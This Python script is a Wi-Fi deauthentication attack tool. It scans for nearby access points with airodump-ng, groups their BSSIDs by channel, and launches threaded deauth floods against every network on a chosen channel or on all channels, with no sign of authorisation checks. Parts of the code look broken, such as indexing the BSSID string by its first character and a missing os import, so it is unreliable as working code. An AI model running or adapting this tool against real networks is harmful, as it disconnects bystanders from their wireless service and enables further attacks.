import subprocess
from unitils import *
ir=inlineraise
import threading
import sys
args=sys.argv
if not "-i" in args:
    wifi_interfaces=get_interfaces()
    for i,interface in enumerate(wifi_interfaces):
        print(f"[{i}] - {interface[0]} ({interface[1]})")
    ans = input("Please select the number of the interface you would like to use\n>")
interface=wlan_interface((wifi_interfaces[int(ans if ans.isdigit() else 0 if ans == "" else ir("Answer must be an integer!"))][0])if "-i" not in args else args[args.index("-i")+1])
ans=""
if not "-s" in args:
    ans = input("would you like to scan for BSSIDs? (Y/n)\n>")
if ans.lower() in ["","y","yes","ye","ys"] or "-s" in args:
    print("Starting airodump-ng to get a list of BSSIDs & channels")
    print("Press Ctrl+C when you are ready to continue")
    countdown_sleep(5,f"Starting airodump on {interface.interface}")
    os.system(f"sudo airodump-ng {interface.interface} -w BSSIDs --output-format csv")
    input("Press Enter to continue")
    with open("BSSIDs-01.csv","r") as f:
        content = f.read().split("\n")
        whitespace_lines=[]
        for i,line in enumerate(content):
            if line == "":
                whitespace_lines.append(i)
        content = content[2:whitespace_lines[1]]
        list_of_BSSIDs=[]
        for line in content:
            if "<length" in line:
                continue
            line=line.split(",")
            BSSID,FTS,LTS,channel,Speed,Privacy,Cipher,Authentication,Power,num_beacons,IV,IP,IDlen,name,key=line
            list_of_BSSIDs.append(f"{BSSID},{channel.strip()},{name}")
if not ans.lower() in ["","y","yes","ye","ys"]:
    ans=input("Please write the file name for your list of BSSIDs & channels \n(CSV format BSSID,Channel,Name)\n(defualt: BSSIDs.csv)\n>")
    list_of_BSSIDs = open(ans if ans else "BSSIDs.csv","r").read().split("\n")
try:
    common_channels={}
    for item in list_of_BSSIDs:
        BSSID,channel,name = item.split(",")
        if channel == "-1":
            continue
        if not channel in common_channels.keys():
            common_channels[channel]=[BSSID]
        elif channel in common_channels.keys():
            common_channels[channel].append(BSSID)
    for item in common_channels.keys():
        print(f"[{item}] ({common_channels[item] if will_fit(len(str(common_channels[item]))) else len(common_channels[item])})")
    ans = input("Please write the number of the channel you would like to Deauth (leave blank for all)\n>")
    if not ans in common_channels.keys() and not ans:
        multi_deauth(interface,common_channels)
        exit()
    elif ans not in common_channels.keys(): raise Exception("Answer should be blank or a value in common_channels!")
    interface.Start_interface(int(ans))
    threads=0
    for BSSID in common_channels[ans]:
        BSSID=bssid(BSSID[0],int(ans))
        Thread = threading.Thread(target=BSSID.Deauth,args=(interface,0))
        threads+=1
        Thread.start()
    print(f"Started {threads} Threads!")
    while True:
        try:
            pass
        except KeyboardInterrupt:
            interface.Stop_interface(interface)
            exit()
except KeyboardInterrupt:
    exit()